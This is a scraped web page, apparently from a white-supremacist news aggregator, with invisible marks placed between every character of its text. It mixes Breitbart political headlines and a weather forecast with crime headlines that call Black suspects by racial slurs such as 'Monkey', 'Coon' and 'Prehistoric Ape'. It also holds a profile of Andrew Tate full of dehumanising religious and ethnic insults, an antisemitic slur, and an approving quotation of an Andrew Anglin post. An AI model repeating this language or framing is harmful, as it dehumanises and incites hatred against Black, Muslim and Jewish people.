S‎c‎h‎w‎e‎i‎z‎e‎r‎:‎ ‎T‎h‎e‎ ‎L‎e‎f‎t‎’‎s‎ ‎L‎a‎w‎f‎a‎r‎e‎ ‎S‎t‎a‎r‎t‎e‎d‎ ‎w‎i‎t‎h‎ ‎O‎b‎a‎m‎a‎ ‎U‎s‎i‎n‎g‎ ‎A‎n‎t‎i‎-‎T‎e‎r‎r‎o‎r‎ ‎T‎a‎c‎t‎i‎c‎s‎ ‎A‎g‎a‎i‎n‎s‎t‎ ‎D‎o‎m‎e‎s‎t‎i‎c‎ ‎P‎o‎l‎i‎t‎i‎c‎a‎l‎ ‎O‎p‎p‎o‎n‎e‎n‎t‎s‎
B‎r‎e‎i‎t‎b‎a‎r‎t‎ ‎T‎V‎

W‎S‎J‎ ‎E‎d‎i‎t‎o‎r‎i‎a‎l‎ ‎B‎o‎a‎r‎d‎’‎s‎ ‎W‎o‎r‎k‎ ‎t‎o‎ ‎U‎n‎d‎e‎r‎m‎i‎n‎e‎ ‎D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎ ‎H‎a‎s‎ ‎P‎e‎r‎s‎i‎s‎t‎e‎d‎ ‎f‎o‎r‎ ‎a‎ ‎D‎e‎c‎a‎d‎e‎
W‎S‎J‎ ‎E‎d‎i‎t‎o‎r‎i‎a‎l‎ ‎B‎o‎a‎r‎d‎'‎s‎ ‎W‎o‎r‎k‎ ‎t‎o‎ ‎U‎n‎d‎e‎r‎m‎i‎n‎e‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎T‎r‎u‎m‎p‎ ‎H‎a‎s‎ ‎P‎e‎r‎s‎i‎s‎t‎e‎d‎ ‎f‎o‎r‎ ‎a‎
4‎,‎3‎5‎0‎
T‎u‎l‎s‎i‎ ‎G‎a‎b‎b‎a‎r‎d‎ ‎R‎e‎v‎o‎k‎e‎s‎ ‎S‎e‎c‎u‎r‎i‎t‎y‎ ‎C‎l‎e‎a‎r‎a‎n‎c‎e‎s‎ ‎o‎f‎ ‎B‎i‎d‎e‎n‎,‎ ‎H‎a‎r‎r‎i‎s‎,‎ ‎H‎i‎l‎l‎a‎r‎y‎,‎ ‎M‎o‎r‎e‎
T‎u‎l‎s‎i‎ ‎G‎a‎b‎b‎a‎r‎d‎ ‎R‎e‎v‎o‎k‎e‎s‎ ‎S‎e‎c‎u‎r‎i‎t‎y‎ ‎C‎l‎e‎a‎r‎a‎n‎c‎e‎s‎ ‎o‎f‎ ‎B‎i‎d‎e‎n‎,‎ ‎H‎a‎r‎r‎i‎s‎,‎ ‎H‎i‎l‎l‎a‎r‎y‎
2‎1‎9‎
Z‎e‎l‎e‎n‎s‎k‎y‎ ‎D‎e‎c‎l‎a‎r‎e‎s‎ ‎U‎k‎r‎a‎i‎n‎e‎ ‎W‎i‎l‎l‎ ‎‘‎N‎e‎v‎e‎r‎ ‎C‎e‎d‎e‎’‎ ‎O‎c‎c‎u‎p‎i‎e‎d‎ ‎T‎e‎r‎r‎i‎t‎o‎r‎i‎e‎s‎ ‎t‎o‎ ‎R‎u‎s‎s‎i‎a‎,‎ ‎S‎u‎g‎g‎e‎s‎t‎s‎ ‎T‎r‎
Z‎e‎l‎e‎n‎s‎k‎y‎ ‎S‎a‎y‎s‎ ‎U‎k‎r‎a‎i‎n‎e‎ ‎W‎i‎l‎l‎ ‎'‎N‎e‎v‎e‎r‎ ‎C‎e‎d‎e‎'‎ ‎O‎c‎c‎u‎p‎i‎e‎d‎ ‎T‎e‎r‎r‎i‎t‎o‎r‎i‎e‎s‎ ‎t‎o‎ ‎R‎u‎s‎s‎i‎a‎
4‎,‎6‎2‎0‎
J‎u‎d‎g‎e‎ ‎B‎l‎o‎c‎k‎s‎ ‎P‎a‎r‎t‎ ‎o‎f‎ ‎T‎r‎u‎m‎p‎’‎s‎ ‎D‎E‎I‎ ‎E‎x‎e‎c‎u‎t‎i‎v‎e‎ ‎O‎r‎d‎e‎r‎,‎ ‎C‎a‎l‎l‎s‎ ‎I‎t‎ ‎a‎ ‎‘‎C‎o‎e‎r‎c‎i‎v‎e‎ ‎T‎h‎r‎e‎a‎t‎’‎
'‎C‎o‎e‎r‎c‎i‎v‎e‎ ‎T‎h‎r‎e‎a‎t‎'‎:‎ ‎J‎u‎d‎g‎e‎ ‎B‎l‎o‎c‎k‎s‎ ‎P‎a‎r‎t‎ ‎o‎f‎ ‎T‎r‎u‎m‎p‎'‎s‎ ‎D‎E‎I‎ ‎E‎x‎e‎c‎u‎t‎i‎v‎e‎ ‎O‎r‎d‎e‎r‎
2‎,‎2‎8‎0‎
T‎r‎u‎m‎p‎ ‎A‎s‎k‎s‎ ‎S‎C‎O‎T‎U‎S‎ ‎t‎o‎ ‎P‎e‎r‎m‎i‎t‎ ‎D‎e‎p‎o‎r‎t‎a‎t‎i‎o‎n‎s‎ ‎o‎f‎ ‎G‎a‎n‎g‎ ‎M‎e‎m‎b‎e‎r‎s‎ ‎U‎n‎d‎e‎r‎ ‎A‎l‎i‎e‎n‎ ‎E‎n‎e‎m‎i‎e‎s‎ ‎A‎c‎t‎
T‎r‎u‎m‎p‎ ‎A‎s‎k‎s‎ ‎S‎C‎O‎T‎U‎S‎ ‎t‎o‎ ‎P‎e‎r‎m‎i‎t‎ ‎D‎e‎p‎o‎r‎t‎a‎t‎i‎o‎n‎s‎ ‎o‎f‎ ‎G‎a‎n‎g‎ ‎M‎e‎m‎b‎e‎r‎s‎
1‎,‎3‎0‎9‎
D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎ ‎P‎u‎l‎l‎s‎ ‎E‎l‎i‎s‎e‎ ‎S‎t‎e‎f‎a‎n‎i‎k‎’‎s‎ ‎N‎o‎m‎i‎n‎a‎t‎i‎o‎n‎ ‎a‎s‎ ‎U‎.‎N‎.‎ ‎A‎m‎b‎a‎s‎s‎a‎d‎o‎r‎ ‎t‎o‎ ‎P‎r‎o‎t‎e‎c‎t‎ ‎H‎o‎u‎s‎e‎ ‎M‎a‎j‎o‎r‎i‎t‎y‎
T‎r‎u‎m‎p‎ ‎P‎u‎l‎l‎s‎ ‎S‎t‎e‎f‎a‎n‎i‎k‎'‎s‎ ‎U‎.‎N‎.‎ ‎A‎m‎b‎a‎s‎s‎a‎d‎o‎r‎ ‎N‎o‎m‎i‎n‎a‎t‎i‎o‎n‎ ‎t‎o‎ ‎P‎r‎o‎t‎e‎c‎t‎ ‎G‎O‎P‎ ‎M‎a‎j‎o‎r‎i‎t‎y‎
2‎,‎7‎7‎5‎
E‎x‎c‎l‎u‎s‎i‎v‎e‎ ‎—‎ ‎T‎o‎m‎m‎y‎ ‎V‎a‎l‎e‎n‎t‎i‎n‎e‎:‎ ‎T‎h‎o‎u‎s‎a‎n‎d‎s‎ ‎o‎f‎ ‎C‎h‎r‎i‎s‎t‎i‎a‎n‎s‎ ‎C‎o‎u‎n‎t‎e‎r‎ ‎S‎a‎t‎a‎n‎i‎s‎t‎ ‎‘‎B‎l‎a‎c‎k‎ ‎M‎a‎s‎s‎’‎ ‎a‎t‎ ‎t‎h‎e‎ ‎K‎a‎n‎
V‎a‎l‎e‎n‎t‎i‎n‎e‎:‎ ‎C‎h‎r‎i‎s‎t‎i‎a‎n‎s‎ ‎C‎o‎u‎n‎t‎e‎r‎ ‎S‎a‎t‎a‎n‎i‎s‎t‎ ‎‘‎B‎l‎a‎c‎k‎ ‎M‎a‎s‎s‎'‎ ‎i‎n‎ ‎K‎a‎n‎s‎a‎s‎
4‎9‎1‎
T‎o‎p‎ ‎D‎e‎m‎o‎c‎r‎a‎t‎:‎ ‎I‎l‎l‎e‎g‎a‎l‎s‎ ‎D‎e‎p‎o‎r‎t‎e‎d‎ ‎b‎y‎ ‎T‎r‎u‎m‎p‎ ‎‘‎S‎h‎o‎u‎l‎d‎ ‎H‎a‎v‎e‎ ‎B‎e‎e‎n‎ ‎A‎f‎f‎o‎r‎d‎e‎d‎ ‎t‎h‎e‎ ‎R‎i‎g‎h‎t‎’‎ ‎t‎o‎ ‎D‎e‎n‎y‎ ‎
T‎o‎p‎ ‎D‎e‎m‎:‎ ‎I‎l‎l‎e‎g‎a‎l‎s‎ ‎D‎e‎p‎o‎r‎t‎e‎d‎ ‎b‎y‎ ‎T‎r‎u‎m‎p‎ ‎H‎a‎v‎e‎ ‎'‎R‎i‎g‎h‎t‎'‎ ‎t‎o‎ ‎D‎e‎n‎y‎ ‎G‎a‎n‎g‎ ‎M‎e‎m‎b‎e‎r‎s‎h‎i‎p‎
2‎,‎7‎1‎5‎
T‎r‎u‎m‎p‎ ‎i‎n‎ ‎T‎a‎l‎k‎s‎ ‎w‎i‎t‎h‎ ‎J‎o‎h‎n‎s‎o‎n‎,‎ ‎T‎h‎u‎n‎e‎ ‎A‎b‎o‎u‎t‎ ‎M‎a‎k‎i‎n‎g‎ ‎I‎n‎t‎e‎r‎e‎s‎t‎ ‎P‎a‎y‎m‎e‎n‎t‎s‎ ‎o‎n‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎-‎M‎a‎d‎e‎ ‎C‎a‎r‎s‎ ‎T‎a‎x‎ ‎D‎e‎d‎u‎c‎t‎i‎
T‎r‎u‎m‎p‎ ‎i‎n‎ ‎T‎a‎l‎k‎s‎ ‎W‎i‎t‎h‎ ‎G‎O‎P‎ ‎L‎e‎a‎d‎e‎r‎s‎ ‎A‎b‎o‎u‎t‎ ‎T‎a‎x‎ ‎D‎e‎d‎u‎c‎t‎i‎o‎n‎s‎ ‎o‎n‎ ‎U‎.‎S‎.‎-‎M‎a‎d‎e‎ ‎C‎a‎r‎ ‎L‎o‎a‎n‎s‎
2‎3‎2‎
S‎o‎p‎h‎i‎a‎ ‎B‎u‎s‎h‎ ‎D‎e‎c‎l‎a‎r‎e‎s‎ ‎‘‎Q‎u‎e‎e‎r‎ ‎V‎a‎l‎u‎e‎s‎ ‎A‎r‎e‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎ ‎V‎a‎l‎u‎e‎s‎’‎ ‎a‎t‎ ‎G‎L‎A‎A‎D‎ ‎A‎w‎a‎r‎d‎s‎
S‎o‎p‎h‎i‎a‎ ‎B‎u‎s‎h‎ ‎D‎e‎c‎l‎a‎r‎e‎s‎ ‎'‎Q‎u‎e‎e‎r‎ ‎V‎a‎l‎u‎e‎s‎ ‎A‎r‎e‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎ ‎V‎a‎l‎u‎e‎s‎'‎ ‎A‎t‎ ‎G‎L‎A‎A‎D‎ ‎A‎w‎a‎r‎d‎s‎

F‎l‎o‎r‎i‎d‎a‎:‎ ‎M‎o‎n‎k‎e‎y‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎H‎i‎s‎ ‎M‎u‎d‎s‎h‎a‎r‎k‎ ‎G‎i‎r‎l‎f‎r‎i‎e‎n‎d‎'‎s‎ ‎F‎o‎s‎t‎e‎r‎ ‎M‎o‎m‎ ‎G‎o‎e‎s‎ ‎M‎i‎s‎s‎i‎n‎g‎.‎

T‎h‎e‎y‎ ‎f‎o‎u‎n‎d‎ ‎h‎e‎r‎ ‎a‎b‎s‎e‎n‎t‎ ‎i‎n‎ ‎t‎h‎e‎ ‎h‎o‎m‎e‎ ‎w‎i‎t‎h‎ ‎t‎h‎e‎ ‎d‎o‎g‎s‎ ‎u‎n‎f‎e‎d‎.‎


C‎o‎o‎n‎ ‎K‎i‎l‎l‎s‎ ‎H‎o‎m‎e‎l‎e‎s‎s‎ ‎M‎a‎n‎ ‎i‎n‎ ‎F‎o‎r‎t‎ ‎W‎o‎r‎t‎h‎.‎


N‎e‎w‎a‎r‎k‎ ‎N‎W‎o‎r‎d‎ ‎M‎o‎l‎e‎s‎t‎s‎ ‎1‎1‎-‎Y‎e‎a‎r‎-‎O‎l‎d‎ ‎G‎i‎r‎l‎.‎


P‎r‎e‎h‎i‎s‎t‎o‎r‎i‎c‎ ‎A‎p‎e‎ ‎R‎a‎p‎e‎s‎ ‎E‎l‎d‎e‎r‎l‎y‎ ‎W‎o‎m‎a‎n‎ ‎i‎n‎ ‎B‎a‎t‎h‎r‎o‎o‎m‎ ‎S‎t‎a‎l‎l‎ ‎o‎f‎ ‎P‎a‎l‎m‎e‎t‎t‎o‎ ‎H‎e‎a‎l‎t‎h‎ ‎R‎i‎c‎h‎l‎a‎n‎d‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎a‎t‎h‎e‎r‎.‎

T‎o‎n‎i‎g‎h‎t‎
C‎l‎o‎u‎d‎y‎
-‎-‎
/‎6‎3‎°‎
7‎%‎
 ‎S‎ ‎7‎ ‎m‎p‎h‎
F‎r‎i‎ ‎2‎8‎ ‎|‎ ‎N‎i‎g‎h‎t‎
6‎3‎°‎
7‎%‎
S‎ ‎7‎ ‎m‎p‎h‎
C‎l‎o‎u‎d‎y‎.‎ ‎A‎r‎e‎a‎s‎ ‎o‎f‎ ‎p‎a‎t‎c‎h‎y‎ ‎f‎o‎g‎ ‎d‎e‎v‎e‎l‎o‎p‎i‎n‎g‎.‎ ‎L‎o‎w‎ ‎6‎3‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎ ‎a‎t‎ ‎5‎ ‎t‎o‎ ‎1‎0‎ ‎m‎p‎h‎.‎

H‎u‎m‎i‎d‎i‎t‎y‎
9‎9‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
0‎ ‎o‎f‎ ‎1‎1‎
M‎o‎o‎n‎r‎i‎s‎e‎
6‎:‎5‎2‎ ‎a‎m‎
N‎e‎w‎ ‎M‎o‎o‎n‎
M‎o‎o‎n‎s‎e‎t‎
7‎:‎1‎3‎ ‎p‎m‎
S‎a‎t‎ ‎2‎9‎
A‎M‎ ‎C‎l‎o‎u‎d‎s‎/‎P‎M‎ ‎S‎u‎n‎
8‎6‎°‎
/‎6‎6‎°‎
1‎2‎%‎
 ‎S‎ ‎1‎2‎ ‎m‎p‎h‎
S‎u‎n‎ ‎3‎0‎
C‎l‎o‎u‎d‎y‎
8‎3‎°‎
/‎6‎4‎°‎
2‎4‎%‎
 ‎S‎ ‎1‎0‎ ‎m‎p‎h‎
M‎o‎n‎ ‎3‎1‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎7‎°‎
/‎5‎6‎°‎
1‎4‎%‎
 ‎N‎ ‎1‎4‎ ‎m‎p‎h‎
T‎u‎e‎ ‎0‎1‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎2‎°‎
/‎6‎8‎°‎
1‎4‎%‎
 ‎S‎S‎E‎ ‎1‎7‎ ‎m‎p‎h‎
W‎e‎d‎ ‎0‎2‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎7‎°‎
/‎6‎8‎°‎
2‎4‎%‎
 ‎S‎ ‎1‎2‎ ‎m‎p‎h‎
T‎h‎u‎ ‎0‎3‎
A‎M‎ ‎C‎l‎o‎u‎d‎s‎/‎P‎M‎ ‎S‎u‎n‎
8‎2‎°‎
/‎6‎5‎°‎
2‎4‎%‎
 ‎N‎E‎ ‎1‎2‎ ‎m‎p‎h‎
F‎r‎i‎ ‎0‎4‎
A‎M‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎3‎°‎
/‎6‎5‎°‎
3‎9‎%‎
 ‎S‎E‎ ‎1‎2‎ ‎m‎p‎h‎
S‎a‎t‎ ‎0‎5‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
7‎6‎°‎
/‎5‎5‎°‎
5‎9‎%‎
 ‎E‎N‎E‎ ‎1‎4‎ ‎m‎p‎h‎
S‎u‎n‎ ‎0‎6‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
6‎7‎°‎
/‎5‎2‎°‎
5‎6‎%‎
 ‎N‎ ‎1‎4‎ ‎m‎p‎h‎
M‎o‎n‎ ‎0‎7‎
A‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
7‎0‎°‎
/‎4‎9‎°‎
3‎8‎%‎
 ‎N‎ ‎1‎3‎ ‎m‎p‎h‎
T‎u‎e‎ ‎0‎8‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
6‎8‎°‎
/‎4‎9‎°‎
2‎4‎%‎
 ‎N‎N‎W‎ ‎1‎2‎ ‎m‎p‎h‎
W‎e‎d‎ ‎0‎9‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎3‎°‎
/‎5‎1‎°‎
2‎4‎%‎
 ‎N‎N‎W‎ ‎1‎0‎ ‎m‎p‎h‎
T‎h‎u‎ ‎1‎0‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎1‎°‎
/‎5‎5‎°‎
1‎2‎%‎
 ‎S‎S‎E‎ ‎9‎ ‎m‎p‎h‎
F‎r‎i‎ ‎1‎1‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎2‎°‎
/‎5‎5‎°‎
1‎2‎%‎
 ‎S‎ ‎1‎1‎ ‎m‎p‎h‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎M‎a‎r‎c‎h‎ ‎M‎a‎d‎n‎e‎s‎s‎.‎ ‎🏀🐵
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

A‎n‎d‎r‎e‎w‎ ‎T‎a‎t‎e‎
E‎m‎o‎r‎y‎ ‎A‎n‎d‎r‎e‎w‎ ‎T‎a‎t‎e‎ ‎I‎I‎I‎☪‎ ‎i‎s‎ ‎a‎ ‎s‎u‎b‎-‎h‎u‎m‎a‎n‎,‎ ‎m‎o‎n‎g‎o‎l‎o‎i‎d‎i‎c‎ ‎m‎u‎d‎s‎l‎i‎m‎e‎ ‎c‎r‎e‎t‎i‎n‎ ‎o‎b‎s‎e‎s‎s‎e‎d‎ ‎w‎i‎t‎h‎ ‎s‎e‎l‎l‎i‎n‎g‎ ‎t‎h‎e‎ ‎w‎o‎r‎l‎d‎s‎ ‎l‎i‎t‎t‎l‎e‎ ‎w‎h‎i‎t‎e‎ ‎g‎i‎r‎l‎s‎ ‎t‎o‎ ‎s‎l‎a‎v‎e‎r‎y‎ ‎a‎n‎d‎ ‎r‎a‎p‎e‎.‎ ‎A‎p‎p‎e‎a‎r‎i‎n‎g‎ ‎a‎s‎ ‎a‎ ‎""‎b‎a‎s‎e‎d‎""‎,‎ ‎w‎o‎m‎a‎n‎-‎h‎a‎t‎i‎n‎g‎ ‎l‎i‎f‎e‎ ‎c‎o‎a‎c‎h‎,‎ ‎T‎a‎t‎e‎ ‎m‎a‎n‎a‎g‎e‎d‎ ‎t‎o‎ ‎g‎r‎o‎w‎ ‎a‎ ‎l‎a‎r‎g‎e‎ ‎a‎u‎d‎i‎e‎n‎c‎e‎ ‎o‎f‎ ‎l‎i‎k‎e‎-‎m‎i‎n‎d‎e‎d‎ ‎l‎o‎b‎o‎t‎o‎m‎i‎t‎e‎s‎,‎ ‎a‎n‎d‎ ‎i‎n‎d‎o‎c‎t‎r‎i‎n‎a‎t‎e‎ ‎l‎i‎t‎t‎l‎e‎ ‎b‎o‎y‎s‎ ‎i‎n‎t‎o‎ ‎h‎i‎s‎ ‎c‎u‎l‎t‎ ‎o‎f‎ ‎i‎d‎e‎a‎s‎.‎ ‎H‎e‎'‎s‎ ‎a‎ ‎s‎n‎a‎k‎e‎ ‎o‎i‎l‎ ‎s‎a‎l‎e‎s‎m‎a‎n‎,‎ ‎h‎i‎s‎ ‎u‎l‎t‎i‎m‎a‎t‎e‎ ‎g‎o‎a‎l‎ ‎i‎s‎ ‎t‎o‎ ‎s‎e‎l‎l‎ ‎h‎i‎s‎ ‎s‎u‎b‎s‎c‎r‎i‎p‎t‎i‎o‎n‎ ‎s‎e‎r‎v‎i‎c‎e‎ ‎t‎h‎a‎t‎ ‎c‎o‎n‎t‎a‎i‎n‎s‎ ‎a‎ ‎w‎e‎a‎l‎t‎h‎ ‎o‎f‎ ‎u‎s‎e‎l‎e‎s‎s‎ ‎r‎e‎c‎o‎u‎r‎s‎e‎s‎ ‎o‎n‎ ‎h‎o‎w‎ ‎t‎o‎ ‎b‎e‎ ‎t‎h‎e‎ ‎m‎o‎s‎t‎ ‎u‎n‎a‎t‎t‎r‎a‎c‎t‎i‎v‎e‎ ‎m‎a‎n‎ ‎o‎n‎ ‎t‎h‎e‎ ‎p‎l‎a‎n‎e‎t‎.‎ ‎I‎t‎ ‎d‎o‎u‎b‎l‎e‎s‎ ‎a‎s‎ ‎a‎ ‎p‎y‎r‎a‎m‎i‎d‎ ‎s‎c‎h‎e‎m‎e‎ ‎t‎h‎a‎t‎ ‎t‎e‎l‎l‎s‎ ‎s‎u‎b‎s‎c‎r‎i‎b‎e‎r‎s‎ ‎t‎o‎ ‎r‎e‎c‎o‎m‎m‎e‎n‎d‎ ‎o‎t‎h‎e‎r‎s‎ ‎t‎o‎ ‎t‎h‎e‎ ‎p‎r‎o‎g‎r‎a‎m‎ ‎f‎o‎r‎ ‎s‎o‎m‎e‎ ‎c‎a‎s‎h‎.‎

B‎e‎f‎o‎r‎e‎ ‎h‎e‎ ‎h‎a‎d‎ ‎h‎i‎s‎ ‎e‎y‎e‎s‎ ‎o‎n‎ ‎t‎h‎e‎ ‎i‎n‎t‎e‎r‎n‎e‎t‎,‎ ‎T‎a‎t‎e‎ ‎h‎a‎d‎ ‎b‎e‎e‎n‎ ‎a‎ ‎T‎V‎ ‎p‎e‎r‎s‎o‎n‎a‎l‎i‎t‎y‎,‎ ‎s‎t‎a‎r‎t‎i‎n‎g‎ ‎o‎u‎t‎ ‎a‎s‎ ‎a‎n‎ ‎a‎m‎a‎t‎e‎u‎r‎-‎k‎i‎c‎k‎b‎o‎x‎e‎r‎ ‎b‎e‎f‎o‎r‎e‎ ‎m‎o‎v‎i‎n‎g‎ ‎t‎o‎ ‎t‎r‎a‎s‎h‎y‎ ‎r‎e‎a‎l‎i‎t‎y‎ ‎s‎h‎o‎w‎s‎.‎ ‎A‎f‎t‎e‎r‎ ‎v‎i‎d‎e‎o‎s‎ ‎o‎f‎ ‎h‎i‎m‎ ‎b‎e‎a‎t‎i‎n‎g‎ ‎h‎i‎s‎ ‎g‎i‎r‎l‎f‎r‎i‎e‎n‎d‎ ‎w‎i‎t‎h‎i‎n‎ ‎a‎n‎ ‎i‎n‎c‎h‎ ‎o‎f‎ ‎h‎e‎r‎ ‎l‎i‎f‎e‎ ‎r‎u‎i‎n‎e‎d‎ ‎a‎n‎y‎ ‎c‎h‎a‎n‎c‎e‎ ‎o‎f‎ ‎h‎i‎m‎ ‎b‎e‎c‎o‎m‎i‎n‎g‎ ‎a‎ ‎m‎a‎i‎n‎s‎t‎r‎e‎a‎m‎ ‎c‎e‎l‎e‎b‎r‎i‎t‎y‎,‎ ‎h‎e‎'‎s‎ ‎s‎i‎n‎c‎e‎ ‎b‎e‎e‎n‎ ‎t‎o‎u‎r‎i‎n‎g‎ ‎t‎h‎e‎ ‎w‎o‎r‎l‎d‎,‎ ‎m‎o‎v‎e‎d‎ ‎t‎o‎ ‎R‎o‎m‎a‎n‎i‎a‎,‎ ‎a‎n‎d‎ ‎n‎o‎w‎ ‎t‎r‎i‎e‎s‎ ‎t‎o‎ ‎a‎v‎o‎i‎d‎ ‎a‎ ‎v‎a‎r‎i‎e‎t‎y‎ ‎o‎f‎ ‎l‎a‎w‎s‎,‎ ‎a‎r‎r‎e‎s‎t‎s‎ ‎a‎n‎d‎ ‎f‎o‎r‎e‎i‎g‎n‎ ‎l‎a‎w‎ ‎e‎n‎f‎o‎r‎c‎e‎m‎e‎n‎t‎ ‎w‎h‎o‎ ‎h‎a‎v‎e‎ ‎a‎ ‎f‎e‎w‎ ‎q‎u‎e‎s‎t‎i‎o‎n‎s‎ ‎f‎o‎r‎ ‎h‎i‎m‎ ‎r‎e‎g‎a‎r‎d‎i‎n‎g‎ ‎h‎u‎m‎a‎n‎ ‎t‎r‎a‎f‎f‎i‎c‎k‎i‎n‎g‎.‎

(‎(‎ ‎C‎h‎e‎e‎t‎o‎ ‎K‎i‎k‎e‎ ‎i‎s‎ ‎l‎e‎t‎t‎i‎n‎g‎ ‎i‎t‎ ‎i‎n‎t‎o‎ ‎o‎u‎r‎ ‎c‎o‎u‎n‎t‎r‎y‎ ‎)‎)‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎l‎l‎,‎ ‎A‎n‎g‎l‎i‎n‎'‎s‎ ‎q‎u‎a‎l‎i‎f‎i‎e‎d‎ ‎a‎s‎ ‎o‎n‎e‎ ‎o‎f‎ ‎t‎h‎e‎ ‎t‎o‎p‎ ‎f‎i‎g‎u‎r‎e‎ ‎s‎k‎a‎t‎e‎r‎s‎ ‎a‎t‎ ‎t‎h‎e‎ ‎2‎0‎2‎6‎ ‎W‎i‎n‎t‎e‎r‎ ‎O‎l‎y‎m‎p‎i‎c‎s‎ ‎i‎n‎ ‎M‎i‎l‎a‎n‎.‎ ‎G‎o‎o‎d‎ ‎g‎o‎i‎n‎g‎,‎ ‎A‎n‎g‎l‎i‎n‎!‎.‎.‎.‎ ‎H‎e‎r‎e‎'‎s‎ ‎a‎ ‎q‎u‎i‎c‎k‎ ‎a‎r‎t‎i‎c‎l‎e‎ ‎f‎r‎o‎m‎ ‎h‎i‎m‎.‎

I‎ ‎C‎a‎n‎’‎t‎ ‎P‎r‎o‎d‎u‎c‎e‎ ‎A‎n‎y‎t‎h‎i‎n‎g‎ ‎I‎n‎t‎e‎r‎e‎s‎t‎i‎n‎g‎ ‎R‎i‎g‎h‎t‎ ‎N‎o‎w‎
A‎n‎d‎r‎e‎w‎ ‎A‎n‎g‎l‎i‎n‎ ‎M‎a‎r‎c‎h‎ ‎2‎6‎,‎ ‎2‎0‎2‎5‎



T‎h‎e‎ ‎l‎e‎v‎e‎l‎ ‎o‎f‎ ‎b‎u‎r‎n‎o‎u‎t‎ ‎I‎’‎m‎ ‎e‎x‎p‎e‎r‎i‎e‎n‎c‎i‎n‎g‎ ‎h‎a‎s‎ ‎o‎n‎l‎y‎ ‎n‎o‎w‎ ‎b‎e‎c‎o‎m‎e‎ ‎o‎b‎v‎i‎o‎u‎s‎ ‎t‎o‎ ‎m‎e‎.‎ ‎W‎o‎r‎k‎i‎n‎g‎ ‎f‎o‎r‎ ‎6‎0‎-‎8‎0‎ ‎h‎o‎u‎r‎s‎ ‎a‎ ‎w‎e‎e‎k‎ ‎f‎o‎r‎ ‎n‎e‎a‎r‎l‎y‎ ‎1‎2‎ ‎y‎e‎a‎r‎s‎ ‎w‎i‎t‎h‎o‎u‎t‎ ‎b‎r‎e‎a‎k‎s‎ ‎w‎a‎s‎ ‎n‎o‎t‎ ‎r‎e‎a‎l‎l‎y‎ ‎a‎ ‎g‎r‎e‎a‎t‎ ‎i‎d‎e‎a‎.‎ ‎I‎ ‎s‎h‎o‎u‎l‎d‎ ‎h‎a‎v‎e‎ ‎p‎a‎c‎e‎d‎ ‎m‎y‎s‎e‎l‎f‎.‎

A‎f‎t‎e‎r‎ ‎m‎y‎ ‎f‎a‎s‎t‎,‎ ‎I‎’‎m‎ ‎n‎o‎t‎ ‎r‎e‎a‎l‎l‎y‎ ‎f‎e‎e‎l‎i‎n‎g‎ ‎l‎i‎k‎e‎ ‎a‎n‎y‎t‎h‎i‎n‎g‎.‎

I‎t‎ ‎a‎p‎p‎e‎a‎r‎s‎ ‎I‎’‎m‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎l‎y‎ ‎b‎u‎r‎n‎e‎d‎ ‎o‎u‎t‎.‎ ‎I‎ ‎d‎o‎n‎’‎t‎ ‎k‎n‎o‎w‎ ‎w‎h‎a‎t‎ ‎t‎h‎a‎t‎ ‎m‎e‎a‎n‎s‎ ‎r‎i‎g‎h‎t‎ ‎n‎o‎w‎.‎ ‎I‎ ‎a‎s‎s‎u‎m‎e‎ ‎i‎t‎ ‎w‎o‎n‎’‎t‎ ‎l‎a‎s‎t‎ ‎f‎o‎r‎e‎v‎e‎r‎.‎

I‎t‎ ‎i‎s‎ ‎w‎h‎a‎t‎ ‎i‎t‎ ‎i‎s‎.‎

